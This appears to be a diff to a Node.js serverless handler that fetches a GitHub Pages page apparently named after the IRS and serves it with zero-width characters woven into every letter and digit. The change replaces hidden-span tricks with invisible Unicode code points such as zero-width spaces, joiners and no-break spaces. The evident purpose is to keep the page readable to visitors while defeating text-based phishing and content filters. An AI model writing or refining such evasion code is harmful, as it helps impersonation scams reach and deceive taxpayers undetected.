@@ -4,32 +4,31 @@ import fetch from "node-fetch";
 function randomObfuscationPattern() {
     const obfuscationMethods = [
         (char) => `${char}&#x200B;`, // Zero-width space
-        (char) => `${char}<span style="display:none">${Math.random().toString(36).substring(2, 6)}</span>`, // Hidden text
-        (char) => `${char}<span style="font-size:0">${Math.random().toString(36).substring(2, 6)}</span>`, // Invisible text
-        (char) => `${char}<span style="width:0;height:0;overflow:hidden">${Math.random().toString(36).substring(2, 6)}</span>` // Invisible hidden text
+        (char) => `${char}&#x2060;`, // Invisible separator
+        (char) => `${char}&#xFEFF;`, // Zero-width no-break space
+        (char) => `${char}&#x200D;`, // Zero-width joiner
     ];
     return obfuscationMethods[Math.floor(Math.random() * obfuscationMethods.length)];
 }
 
-// Function to obfuscate text **without altering HTML tags**
+// Function to obfuscate **only text** inside HTML elements while keeping structure intact
 function obfuscateText(text) {
     return text.replace(/([a-zA-Z0-9])/g, (match) => {
-        const obfuscateMethod = randomObfuscationPattern();
-        return obfuscateMethod(match);
+        return randomObfuscationPattern()(match);
     });
 }
 
 // API Handler to serve obfuscated HTML
 export default async function handler(req, res) {
     try {
-        // Fetch the original HTML (Replace with your actual URL)
+        // Fetch the original HTML (Replace with your actual GitHub Pages URL)
         const response = await fetch("https://mightyflavor.github.io/obfuscationnn/IRS_ob"); // Replace with actual URL
         let html = await response.text();
 
-        // Preserve HTML structure, obfuscating only text content inside tags
-        let modifiedHTML = html.replace(/>([^<]+)</g, (match, text) => {
+        // Preserve HTML structure and obfuscate only visible text
+        let modifiedHTML = html.replace(/>([^<>]+)</g, (match, text) => {
             if (text.trim() !== "") {
-                return ">" + obfuscateText(text) + "<"; // Obfuscate text inside tags
+                return ">" + obfuscateText(text) + "<"; // Obfuscate text while keeping tags intact
             }
             return match; // Leave empty tags unchanged
         });
@@ -46,5 +45,3 @@ export default async function handler(req, res) {
         return res.status(500).send("Error fetching or modifying HTML.");
     }
 }
-
-
